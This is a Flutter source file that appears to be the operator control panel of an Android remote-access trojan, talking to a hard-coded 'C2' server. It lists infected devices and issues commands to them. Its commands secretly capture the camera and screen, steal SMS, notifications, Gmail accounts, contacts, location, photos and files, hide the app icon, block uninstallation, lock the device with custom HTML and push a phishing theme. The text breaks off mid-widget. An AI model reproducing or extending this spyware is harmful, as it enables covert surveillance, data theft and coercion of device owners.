import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:file_picker/file_picker.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';

const String baseUrl = "http://dotszprivate.r-cloud.my.id:3447";

enum LogType { info, success, warning, error }
enum TabIndex { devices, control, messages }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, this.type = LogType.info});
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMIX 3D PALETTE
// ═══════════════════════════════════════════════════════════════════════════════
const Color comixBg = Color(0xFFFFF8E7);
const Color comixInk = Color(0xFF1A1A2E);
const Color comixWhite = Colors.white;
const Color comixRed = Color(0xFFFF3B30);
const Color comixBlue = Color(0xFF007AFF);
const Color comixYellow = Color(0xFFFFD600);
const Color comixGreen = Color(0xFF34C759);
const Color comixPurple = Color(0xFFAF52DE);
const Color comixOrange = Color(0xFFFF9500);
const Color comixPink = Color(0xFFFF2D8D);
const Color comixCyan = Color(0xFF32ADE6);
const Color comixTextSub = Color(0xFF4B5563);
const Color comixTextDim = Color(0xFF6B7280);

// keep old aliases working
const Color bgMain = comixBg;
const Color bgSurface = Colors.white;
const Color bgCard = Colors.white;
const Color textMain = comixInk;
const Color textSub = comixTextSub;
const Color accentWhite = comixRed;
const Color borderLight = comixRed;
const Color accentSecondary = comixBlue;
const Color successColor = comixGreen;
const Color warningColor = comixOrange;
const Color errorColor = comixRed;

// ═══════════════════════════════════════════════════════════════════════════════
// COMIX REUSABLE WIDGETS
// ═══════════════════════════════════════════════════════════════════════════════
class ComixPanel extends StatelessWidget {
  final Widget child;
  final Color bgColor;
  final Color shadowColor;
  final double borderWidth;
  final double shadowOffset;
  final BorderRadius radius;
  final EdgeInsets padding;

  const ComixPanel({
    super.key,
    required this.child,
    this.bgColor = Colors.white,
    this.shadowColor = comixInk,
    this.borderWidth = 3,
    this.shadowOffset = 6,
    this.radius = const BorderRadius.all(Radius.circular(20)),
    this.padding = const EdgeInsets.all(16),
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        borderRadius: radius,
        boxShadow: [
          BoxShadow(
            color: shadowColor,
            offset: Offset(shadowOffset, shadowOffset),
            blurRadius: 0,
          ),
        ],
      ),
      child: Container(
        padding: padding,
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: radius,
          border: Border.all(color: comixInk, width: borderWidth),
        ),
        child: child,
      ),
    );
  }
}

class ComixChip extends StatelessWidget {
  final Widget child;
  final Color bgColor;
  const ComixChip({super.key, required this.child, this.bgColor = comixYellow});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: bgColor,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: comixInk, width: 2.5),
        boxShadow: const [
          BoxShadow(color: comixInk, offset: Offset(2.5, 2.5), blurRadius: 0),
        ],
      ),
      child: child,
    );
  }
}

class ComixHalftonePainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = comixInk.withOpacity(0.07);
    const spacing = 16.0;
    for (double y = 0; y < size.height; y += spacing) {
      for (double x = 0; x < size.width; x += spacing) {
        canvas.drawCircle(Offset(x, y), 1.5, paint);
      }
    }
  }
  @override
  bool shouldRepaint(covariant CustomPainter _) => false;
}

class ComixSpeedLinesPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = comixInk.withOpacity(0.035)
      ..strokeWidth = 2
      ..style = PaintingStyle.stroke;
    final center = Offset(size.width / 2, size.height / 2);
    const count = 16;
    for (int i = 0; i < count; i++) {
      final angle = (i / count) * 2 * pi;
      final start = Offset(
        center.dx + 80 * cos(angle),
        center.dy + 80 * sin(angle),
      );
      final end = Offset(
        center.dx + 900 * cos(angle),
        center.dy + 900 * sin(angle),
      );
      canvas.drawLine(start, end, paint);
    }
  }
  @override
  bool shouldRepaint(covariant CustomPainter _) => false;
}

// ═══════════════════════════════════════════════════════════════════════════════
// MAIN PAGE
// ═══════════════════════════════════════════════════════════════════════════════
class ControlPanelPage extends StatefulWidget {
  final Map<String, dynamic>? device;

  const ControlPanelPage({super.key, this.device});

  @override
  State<ControlPanelPage> createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage> with SingleTickerProviderStateMixin {
  TabIndex _currentTab = TabIndex.devices;
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};

  List<dynamic> _devices = [];
  String? _sessionKey;
  Timer? _pollingTimer;

  Map<String, dynamic> _smsData = {};
  Map<String, dynamic> _notifData = {};
  bool _isSmsLoading = false;

  final StreamController<String> _cameraFrameStreamController = StreamController<String>.broadcast();
  final StreamController<Map<String, dynamic>> _screenFrameStreamController = StreamController<Map<String, dynamic>>.broadcast();

  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;

  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();
  final TextEditingController _customExtraController = TextEditingController();

  bool _isJumpscareActive = false;
  bool _isJumpscare2Active = false;
  bool _isDialogSpamActive = false;
  bool _isTouchBlocked = false;
  bool _isTtsSpeaking = false;
  bool _isVideoOverlayActive = false;
  bool _isLockCustomActive = false;
  bool _isAntiUninstallActive = false;
  String _jumpscareUrl = '';

  Map<String, dynamic> _locationData = {};
  bool _locationLoading = false;

  String _selectedSmsKey = '';
  bool _showingSmsDetail = false;

  String _jumpscare2Url = '';
  int _jumpscare2Duration = 3000;
  List<String> _blockedApps = [];

  bool _cameraModalVisible = false;
  String _cameraFrame = '';
  String _cameraFacing = 'front';
  bool _cameraLoading = true;

  bool _screenshotResultVisible = false;
  String _screenshotFrame = '';
  String _screenshotFacing = 'front';
  double _screenshotScale = 1.0;
  double _screenshotOffsetX = 0.0;
  double _screenshotOffsetY = 0.0;

  bool _screenModalVisible = false;
  String _screenFrame = '';
  bool _screenLoading = true;

  BuildContext? _locationLoadingContext;
  BuildContext? _notifLoadingContext;

  List<Map<String, dynamic>> _galleryPhotos = [];
  bool _isGalleryLoading = false;
  bool _galleryModalVisible = false;
  String _currentGalleryImage = '';
  int _currentGalleryIndex = 0;
  final StreamController<List<Map<String, dynamic>>> _galleryStreamController =
      StreamController<List<Map<String, dynamic>>>.broadcast();

  bool _isWaitingForPhoto = false;
  BuildContext? _photoLoadingContext;

  late List<Map<String, dynamic>> _controlItems;

  List<Map<String, dynamic>> _installedApps = [];
  Set<String> _blockedSet = {};

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _loadTokenAndFetch();
    _initSocket();
    _initCameraStream();
    _startPolling();

    _controlItems = [
      {"label": "Flash", "icon": Icons.flash_on, "color": accentSecondary, "command": "flashlight", "isToggle": true, "isOn": _deviceData['flashlight'] ?? false, "needsInput": false},
      {"label": "Lock Device", "icon": Icons.lock, "color": accentWhite, "command": "lockDevice", "isToggle": true, "isOn": _deviceData['deviceLocked'] ?? false, "needsInput": true, "inputHint": "Pesan kunci (opsional)", "inputType": "text"},
      {"label": "Lock V2 (HTML)", "icon": Icons.lock_outline, "color": Colors.indigo, "command": "lockCustom", "isToggle": true, "isOn": _isLockCustomActive, "needsInput": true, "inputHint": "HTML untuk tampilan kunci", "inputType": "multiline"},
      {"label": "Video Overlay", "icon": Icons.movie_creation, "color": Colors.redAccent, "command": "videoOverlay", "isToggle": true, "isOn": _isVideoOverlayActive, "needsInput": false},
      {"label": "Hide Icon", "icon": Icons.visibility_off, "color": accentSecondary, "command": "hideIcon", "isToggle": true, "isOn": _deviceData['iconHidden'] ?? false, "needsInput": false},
      {"label": "Mute Volume", "icon": Icons.volume_off, "color": Colors.red, "command": "muteVolume", "isToggle": true, "isOn": _deviceData['volumeMuted'] ?? false, "needsInput": false},
      {"label": "Anti Uninstall", "icon": Icons.security, "color": accentWhite, "command": "antiUninstall", "isToggle": true, "isOn": _isAntiUninstallActive, "needsInput": false},
      {"label": "Stuck Layar", "icon": Icons.touch_app, "color": accentSecondary, "command": "touchBlock", "isToggle": false, "needsInput": true, "inputHint": "Durasi dalam detik (0 = ∞)", "inputType": "number", "extra": '{"duration": 0}'},
      {"label": "TTS", "icon": Icons.record_voice_over, "color": Colors.purpleAccent, "command": "ttsSpeak", "isToggle": false, "needsInput": true, "inputHint": "Teks untuk diucapkan", "inputType": "text", "extra": '{"text":"Halo, ini tes suara","lang":"id"}'},
      {"label": "Foto Depan", "icon": Icons.camera_front, "color": accentWhite, "command": "camera", "isToggle": false, "needsInput": false, "extra": "front"},
      {"label": "Foto Belakang", "icon": Icons.camera_rear, "color": accentWhite, "command": "camera", "isToggle": false, "needsInput": false, "extra": "back"},
      {"label": "Live Cam Depan", "icon": Icons.videocam, "color": accentWhite, "command": "liveCamera", "isToggle": false, "needsInput": false, "extra": "front"},
      {"label": "Live Cam Belakang", "icon": Icons.videocam, "color": accentWhite, "command": "liveCamera", "isToggle": false, "needsInput": false, "extra": "back"},
      {"label": "Stop Camera", "icon": Icons.stop_circle, "color": Colors.red, "command": "stopCamera", "isToggle": false, "needsInput": false},
      {"label": "Stop Live Screen", "icon": Icons.stop_screen_share, "color": Colors.red, "command": "stopScreen", "isToggle": false, "needsInput": false},
      {"label": "Vibrate", "icon": Icons.vibration, "color": Colors.grey, "command": "vibrate", "isToggle": false, "needsInput": false, "extra": "500"},
      {"label": "Toast", "icon": Icons.message, "color": accentSecondary, "command": "showToast", "isToggle": false, "needsInput": true, "inputHint": "Pesan toast", "inputType": "text", "extra": "Pesan dari C2!"},
      {"label": "Spam Dialog", "icon": Icons.chat, "color": Colors.redAccent, "command": "dialogSpam", "isToggle": false, "needsInput": true, "inputHint": "Teks spam", "inputType": "text", "extra": '{"text":"SPAM dari C2!"}'},
      {"label": "Block App", "icon": Icons.block, "color": Colors.red, "command": "blockApp", "isToggle": false, "needsInput": false},
      {"label": "Unblock App", "icon": Icons.check_circle, "color": Colors.green, "command": "unblockApp", "isToggle": false, "needsInput": true, "inputHint": "Package name (contoh: com.whatsapp)", "inputType": "text", "extra": "com.whatsapp"},
      {"label": "Unblock All", "icon": Icons.check_circle_outline, "color": Colors.greenAccent, "command": "unblockAll", "isToggle": false, "needsInput": false},
      {"label": "Tema Phising", "icon": Icons.color_lens, "color": Colors.greenAccent, "command": "changeTheme", "isToggle": false, "needsInput": true, "inputHint": "Nama tema (whatsapp/instagram/etc)", "inputType": "text", "extra": "whatsapp"},
      {"label": "📍 Get Location", "icon": Icons.location_on, "color": accentSecondary, "command": "getLocation", "isToggle": false, "needsInput": false},
      {"label": "Live Screen", "icon": Icons.screen_share, "color": accentWhite, "command": "screen", "isToggle": false, "needsInput": false, "extra": "start"},
      {"label": "Phone", "icon": Icons.phone_android, "color": accentWhite, "command": "getPhone", "isToggle": false, "needsInput": false},
      {"label": "Gmail", "icon": Icons.email_outlined, "color": Colors.redAccent, "command": "getGmail", "isToggle": false, "needsInput": false},
      {"label": "Kontak", "icon": Icons.contacts_outlined, "color": accentSecondary, "command": "getContacts", "isToggle": false, "needsInput": false},
      {"label": "Jumpscare", "icon": Icons.warning_amber_rounded, "color": Colors.red, "command": "jumpscareStart", "isToggle": true, "isOn": _isJumpscareActive, "needsInput": false},
      {"label": "Jumpscare V2", "icon": Icons.dangerous, "color": Colors.redAccent, "command": "jumpscare2Start", "isToggle": true, "isOn": _isJumpscare2Active, "needsInput": false},
      {"label": "Set Wallpaper", "icon": Icons.wallpaper, "color": Colors.purple, "command": "setWallpaper", "isToggle": false, "needsInput": true, "inputHint": "Masukkan URL Gambar (contoh: https://example.com/image.jpg)", "inputType": "text", "extra": "https://example.com/image.jpg"},
      {"label": "Open Situs", "icon": Icons.public, "color": Colors.green, "command": "openUrl", "isToggle": false, "needsInput": true, "inputHint": "Masukkan URL Situs (contoh: https://example.com)", "inputType": "text", "extra": "https://example.com"},
      {"label": "Galeri", "icon": Icons.photo_library, "color": accentWhite, "command": "getGallery", "isToggle": false, "needsInput": false, "extra": ""},
      {"label": "File Manager", "icon": Icons.folder_open, "color": accentSecondary, "command": "getFiles", "isToggle": false, "needsInput": false, "extra": ""},
      {"label": "Live Cam DX", "icon": Icons.videocam_rounded, "color": Colors.cyanAccent, "command": "liveCamDX", "isToggle": false, "needsInput": false, "extra": ""},
      {"label": "Spy Layar", "icon": Icons.screen_search_desktop_rounded, "color": Colors.purpleAccent, "command": "spyLayar", "isToggle": false, "needsInput": false, "extra": ""},
    ];

    _galleryStreamController.stream.listen((photos) {
      if (mounted) {
        setState(() {
          _galleryPhotos = photos;
          _isGalleryLoading = false;
          _galleryModalVisible = true;
        });
        _addLog("🖼️ Gallery stream update: ${photos.length} foto", LogType.success);
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => GalleryFullscreenPage(
              targetId: _targetId,
              targetModel: _targetModel,
              galleryStream: _galleryStreamController.stream,
              onClose: _closeGalleryFullscreen,
              onRefresh: () {
                _sendCommand('getGallery');
                _addLog("🖼️ Refreshing gallery", LogType.info);
              },
              onDownload: _downloadScreenshot,
            ),
            fullscreenDialog: true,
          ),
        );
      }
    });
  }

  void _initializeAnimations() {
    _glowController = AnimationController(duration: const Duration(milliseconds: 2500), vsync: this);
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateController = AnimationController(duration: const Duration(seconds: 20), vsync: this);
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  Future<void> _loadTokenAndFetch() async {
    final prefs = await SharedPreferences.getInstance();
    _sessionKey = prefs.getString("key");
    if (_sessionKey != null) {
      _fetchDevices();
    }
  }

  void _startPolling() {
    _pollingTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
      _fetchDevices();
    });
  }

  Future<void> _fetchDevices() async {
    if (_sessionKey == null) return;
    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/list-targets"),
        headers: {"x-auth-token": _sessionKey!},
      );
      if (response.statusCode == 200 && mounted) {
        setState(() {
          _devices = jsonDecode(response.body);
        });
      }
    } catch (e) {
      debugPrint("Fetch devices error: $e");
    }
  }

  void _initSocket() {
    try {
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL', 'token': _sessionKey ?? ''})
            .enableAutoConnect()
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("✅ Sistem Kontrol Terhubung", LogType.success);
          socket.emit('controller:join', {'token': _sessionKey});
          _setupSocketListeners();
        }
      });

      socket.onDisconnect((_) {
        if (mounted) setState(() => _isConnected = false);
      });

      socket.connect();
    } catch (e) {
      _addLog("❌ Socket Error: $e", LogType.error);
    }
  }

  void _setupSocketListeners() {
    socket.on('devices:update', (data) {
      if (mounted) {
        setState(() {
          _devices = List<dynamic>.from(data);
        });
      }
    });

    socket.on('device:location', (data) {
      if (data['deviceId'] == _targetId) {
        if (mounted) {
          setState(() {
            _locationData = data;
            _locationLoading = false;
          });
          _addLog("📍 Location received", LogType.success);

          if (_locationLoadingContext != null) {
            try {
              Navigator.of(_locationLoadingContext!, rootNavigator: true).pop();
            } catch (_) {}
            _locationLoadingContext = null;
          }

          Future.delayed(const Duration(milliseconds: 300), () {
            if (mounted) {
              Navigator.of(context, rootNavigator: true).push(
                MaterialPageRoute(
                  builder: (context) => LocationFullscreenPage(
                    targetModel: _targetModel,
                    locationData: _locationData,
                  ),
                  fullscreenDialog: true,
                ),
              );
            }
          });
        }
      }
    });

    socket.on('device:sms', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _smsData = data;
          _addLog("📱 SMS received: ${data['list']?.length ?? 0} apps", LogType.success);
        });
      }
    });

    socket.on('device:status', (data) {
      if (data['deviceId'] == _targetId) {
        final status = data['status'] as Map? ?? {};

        final smsList = status['smsList'];
        if (smsList != null) {
          if (mounted) {
            setState(() {
              _smsData.clear();
              for (var app in smsList) {
                final key = '${app['pkg']}_${app['appName']}';
                _smsData[key] = {
                  'appName': app['appName'],
                  'pkg': app['pkg'],
                  'messages': app['messages'] ?? []
                };
              }
              _isSmsLoading = false;
            });
            _addLog("📬 SMS list loaded: ${smsList.length} apps", LogType.success);
          }
        }

        final notifList = status['notifList'];
        if (notifList != null) {
          if (mounted) {
            setState(() {
              _notifData.clear();
              for (var app in notifList) {
                final key = app['pkg'];
                _notifData[key] = {
                  'appName': app['appName'],
                  'pkg': key,
                  'messages': app['messages'] ?? []
                };
              }
            });
            _addLog("🔔 Notif list loaded: ${notifList.length} apps", LogType.info);
          }
        }
      }
    });

    socket.on('device:notif', (data) {
      if (data['deviceId'] == _targetId) {
        if (mounted) {
          setState(() {
            final notif = data['notif'];
            if (notif != null) {
              final key = notif['pkg'];
              if (!_notifData.containsKey(key)) {
                _notifData[key] = {
                  'appName': notif['appName'],
                  'pkg': key,
                  'messages': []
                };
              }
              final messages = _notifData[key]['messages'] as List;
              final exists = messages.any((x) =>
                  x['time'] == notif['time'] && x['text'] == notif['text']);
              if (!exists) {
                messages.insert(0, notif);
              }
            }
          });
          _addLog("🔔 Notif diterima", LogType.info);
        }
      }
    });

    socket.on('camera:frame', (data) {
      if (data['deviceId'] == _targetId && data['frame'] != null) {
        final frame = data['frame'];
        _cameraFrameStreamController.add(frame);
        _addLog("📷 Camera frame received", LogType.info);

        if (_isWaitingForPhoto) {
          _isWaitingForPhoto = false;
          if (_photoLoadingContext != null) {
            try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
            _photoLoadingContext = null;
          }
          if (mounted) {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) => ScreenshotResultPage(
                  targetModel: _targetModel,
                  screenshotFrame: frame,
                  screenshotFacing: _cameraFacing,
                  onClose: () {
                    Navigator.pop(context);
                    _sendCommand('camera', extra: 'stop');
                  },
                ),
                fullscreenDialog: true,
              ),
            );
          }
        }
      }
    });

    socket.on('screen:frame', (data) {
      if (data['frame'] != null) {
        _screenFrameStreamController.add({
          'frame': data['frame'],
          'app': data['currentApp'] ?? data['app'] ?? '',
          'ts': DateTime.now().millisecondsSinceEpoch,
        });
        setState(() {
          _screenFrame = data['frame'];
          _screenLoading = false;
          _screenModalVisible = true;
        });
        _addLog("🖥️ Screen frame received", LogType.info);
      }
    });

    socket.on('command_response', (data) {
      if (data['deviceId'] == _targetId) {
        final cmd = data['command']?.toString() ?? '';
        final status = data['status']?.toString() ?? '';
        _addLog("📥 Response: $cmd → $status", LogType.info);
        switch (cmd) {
          case 'jumpscareStart':
            setState(() => _isJumpscareActive = status == 'started');
            _updateControlItemState('jumpscareStart', status == 'started');
            break;
          case 'jumpscareStop':
            setState(() => _isJumpscareActive = false);
            _updateControlItemState('jumpscareStart', false);
            break;
          case 'jumpscare2Start':
            setState(() => _isJumpscare2Active = status == 'started');
            _updateControlItemState('jumpscare2Start', status == 'started');
            break;
          case 'jumpscare2Stop':
            setState(() => _isJumpscare2Active = false);
            _updateControlItemState('jumpscare2Start', false);
            break;
          case 'dialogSpam': setState(() => _isDialogSpamActive = status == 'started'); break;
          case 'dialogSpamStop': setState(() => _isDialogSpamActive = false); break;
          case 'touchBlock': setState(() => _isTouchBlocked = status == 'started'); break;
          case 'touchBlockStop': setState(() => _isTouchBlocked = false); break;
          case 'ttsSpeak': setState(() => _isTtsSpeaking = status == 'started'); break;
          case 'ttsStop': setState(() => _isTtsSpeaking = false); break;
          case 'videoOverlay': setState(() => _isVideoOverlayActive = status == 'started'); break;
          case 'videoOverlayHide': setState(() => _isVideoOverlayActive = false); break;
          case 'lockCustom': setState(() { _isLockCustomActive = status == 'locked'; }); break;
          case 'blockApp': if (data['package'] != null && !_blockedApps.contains(data['package'])) setState(() => _blockedApps.add(data['package'])); break;
          case 'unblockApp': setState(() => _blockedApps.remove(data['package'])); break;
          case 'unblockAll': setState(() => _blockedApps.clear()); break;
          case 'lockDevice':
            if (data['status'] == 'locked' || data['status'] == true) {
              setState(() { _deviceData['deviceLocked'] = true; _updateControlItemState('lockDevice', true); });
            } else {
              setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            }
            break;
          case 'unlockDevice':
            setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            break;
          case 'hideIcon':
            setState(() {
              _deviceData['iconHidden'] = data['status'] == 'hidden';
              _updateControlItemState('hideIcon', data['status'] == 'hidden');
            });
            break;
          case 'muteVolume':
            setState(() {
              _deviceData['volumeMuted'] = data['status'] == 'muted';
              _updateControlItemState('muteVolume', data['status'] == 'muted');
            });
            break;
          case 'antiUninstall':
            setState(() {
              _isAntiUninstallActive = data['status'] == 'active';
              _updateControlItemState('antiUninstall', data['status'] == 'active');
            });
            break;
          case 'flashlight':
            setState(() {
              _deviceData['flashlight'] = data['status'] == 'on';
              _updateControlItemState('flashlight', data['status'] == 'on');
            });
            break;
        }
      }
    });

    socket.on('device:phone', (data) {
      if (data['deviceId'] == _targetId) {
        _addLog("📱 Phone data received", LogType.success);
        _showPhoneBottomSheet(data);
      }
    });

    socket.on('device:gmail', (data) {
      if (data['deviceId'] == _targetId) {
        _addLog("📧 Gmail accounts received", LogType.success);
        _showGmailBottomSheet(data);
      }
    });

    socket.on('device:contacts', (data) {
      if (data['deviceId'] == _targetId) {
        _addLog("📇 Contacts received", LogType.success);
        _showContactsBottomSheet(data);
      }
    });

    socket.on('device:apps', (data) {
      if (data['deviceId'] == _targetId) {
        final apps = data['apps'] as List? ?? [];
        setState(() {
          _installedApps = apps.map((app) => Map<String, dynamic>.from(app)).toList();
        });
      }
    });
  }

  void _updateControlItemState(String command, bool value) {
    for (int i = 0; i < _controlItems.length; i++) {
      if (_controlItems[i]['command'] == command) {
        setState(() {
          _controlItems[i]['isOn'] = value;
        });
        break;
      }
    }
  }

  void _initCameraStream() {
    _cameraFrameStreamController.stream.listen((frame) {});
  }

  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 200) _executionLogs.removeLast();
      });
    }
  }

  String _formatTime(DateTime time) =>
      "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return successColor;
      case LogType.error: return errorColor;
      case LogType.warning: return warningColor;
      default: return textSub;
    }
  }

  Future<void> _sendCommand(String command, {String? extra}) async {
    if (!_isConnected) {
      _addLog("⚠️ C2 Disconnected", LogType.warning);
      return;
    }
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Device ID tidak valid!", LogType.error);
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key');
    if (token == null || token.isEmpty) {
      _addLog("❌ Token hilang! Login ulang.", LogType.error);
      if (mounted) Navigator.pushReplacementNamed(context, '/login');
      return;
    }

    setState(() => _isProcessing = true);
    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": token,
        },
        body: jsonEncode({
          "command": command,
          "value": extra ?? "",
        }),
      );

      if (response.statusCode == 200) {
        _addLog("🚀 EXEC: $command", LogType.success);
      } else if (response.statusCode == 401) {
        _addLog("❌ Sesi kadaluarsa! Login ulang.", LogType.error);
        if (mounted) Navigator.pushReplacementNamed(context, '/login');
      } else {
        _addLog("❌ ERR: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ HTTP ERR: $e", LogType.error);
    } finally {
      if (mounted) setState(() => _isProcessing = false);
    }
  }

  // ─── DIALOG INPUT (COMIX) ──────────────────────────────────────────
  Future<String?> _showInputDialog({
    required String title,
    required String hint,
    String initialValue = '',
    bool multiline = false,
    TextInputType keyboardType = TextInputType.text,
  }) async {
    final controller = TextEditingController(text: initialValue);
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 24),
        child: ComixPanel(
          bgColor: Colors.white,
          shadowOffset: 8,
          borderWidth: 3.5,
          radius: const BorderRadius.all(Radius.circular(24)),
          padding: const EdgeInsets.all(22),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              ComixChip(
                bgColor: comixYellow,
                child: Text(title,
                    style: const TextStyle(
                        color: comixInk,
                        fontFamily: 'Orbitron',
                        fontSize: 12,
                        fontWeight: FontWeight.w900)),
              ),
              const SizedBox(height: 16),
              TextField(
                controller: controller,
                maxLines: multiline ? 8 : 1,
                keyboardType: keyboardType,
                style: const TextStyle(
                    color: comixInk, fontWeight: FontWeight.w700),
                decoration: InputDecoration(
                  hintText: hint,
                  hintStyle: const TextStyle(
                      color: comixTextDim, fontWeight: FontWeight.w600),
                  filled: true,
                  fillColor: comixYellow.withOpacity(0.25),
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide:
                          const BorderSide(color: comixInk, width: 2.5)),
                  focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: comixBlue, width: 3)),
                ),
              ),
              const SizedBox(height: 18),
              Row(children: [
                Expanded(
                  child: _ComixOutlineBtn(
                    label: 'BATAL',
                    onTap: () => Navigator.pop(context, null),
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: _ComixGradBtn(
                    label: 'KIRIM',
                    icon: Icons.send_rounded,
                    color: comixBlue,
                    onTap: () => Navigator.pop(context, controller.text.trim()),
                  ),
                ),
              ]),
            ],
          ),
        ),
      ),
    );
  }

  // ─── BOTTOM NAV (COMIX) ────────────────────────────────────────────
  Widget _buildBottomNav() {
    return SafeArea(
      top: false,
      bottom: true,
      minimum: const EdgeInsets.fromLTRB(10, 0, 10, 8),
      child: ComixPanel(
        bgColor: Colors.white,
        shadowOffset: 6,
        borderWidth: 3,
        radius: const BorderRadius.all(Radius.circular(24)),
        padding: const EdgeInsets.symmetric(vertical: 6, horizontal: 6),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceAround,
          children: [
            _buildNavItem(Icons.phone_android_rounded, "DEVICES", TabIndex.devices, comixRed),
            _buildNavItem(Icons.settings_rounded, "CONTROL", TabIndex.control, comixBlue),
            _buildNavItem(Icons.chat_bubble_rounded, "MESSAGES", TabIndex.messages, comixGreen),
          ],
        ),
      ),
    );
  }

  Widget _buildNavItem(IconData icon, String label, TabIndex tab, Color color) {
    bool isActive = _currentTab == tab;
    return GestureDetector(
      onTap: () => setState(() => _currentTab = tab),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
        decoration: BoxDecoration(
          color: isActive ? color : Colors.transparent,
          borderRadius: BorderRadius.circular(16),
          border: isActive ? Border.all(color: comixInk, width: 2.5) : null,
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: isActive ? Colors.white : comixInk, size: 22),
            const SizedBox(height: 3),
            Text(label,
                style: TextStyle(
                  color: isActive ? Colors.white : comixInk,
                  fontSize: 9,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 0.5,
                  fontFamily: 'Orbitron',
                )),
          ],
        ),
      ),
    );
  }

  Widget _buildTabContent() {
    switch (_currentTab) {
      case TabIndex.devices:
        return _buildDevicesTab();
      case TabIndex.control:
        return _buildControlTab();
      case TabIndex.messages:
        return _buildMessagesTab();
    }
  }

  // ─── TAB: DEVICES (COMIX) ──────────────────────────────────────────
  Widget _buildDevicesTab() {
    return Column(
      children: [
        _buildDeviceHeader(),
        Expanded(
          child: _devices.isEmpty
              ? Center(
                  child: ComixPanel(
                    bgColor: Colors.white,
                    padding: const EdgeInsets.all(20),
                    child: const Text("NO DEVICES FOUND",
                        style: TextStyle(
                            color: comixInk,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'Orbitron')),
                  ),
                )
              : ListView.builder(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                  itemCount: _devices.length,
                  itemBuilder: (context, index) =>
                      _buildDeviceCard(_devices[index], index),
                ),
        ),
      ],
    );
  }

  Widget _buildDeviceHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(14, 14, 14, 8),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          ComixPanel(
            bgColor: comixRed,
            shadowOffset: 6,
            borderWidth: 3,
            radius: const BorderRadius.all(Radius.circular(16)),
            padding: EdgeInsets.zero,
            child: SizedBox(
              height: 130,
              child: ClipRRect(
                borderRadius: BorderRadius.circular(13),
